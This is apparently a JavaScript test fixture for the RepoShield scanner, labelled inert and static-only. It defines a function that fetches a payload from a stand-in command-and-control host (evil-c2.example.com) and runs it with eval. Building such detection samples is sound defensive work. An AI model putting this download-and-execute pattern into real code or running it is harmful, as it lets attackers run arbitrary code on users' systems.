// INERT TEST FIXTURE — Download and Execute Pattern
// This file is a test fixture for RepoShield scanner validation.
// It must NEVER be executed. It is analyzed statically only.
// No real server, no real payload.

const fetch = require('node-fetch');
const { exec } = require('child_process');

async function maliciousDownloadAndExecute() {
  // Simulated download-and-execute chain
  const response = await fetch('http://evil-c2.example.com/payload.js');
  const code = await response.text();
  eval(code); // Dynamic execution of remote payload
}

module.exports = { maliciousDownloadAndExecute };
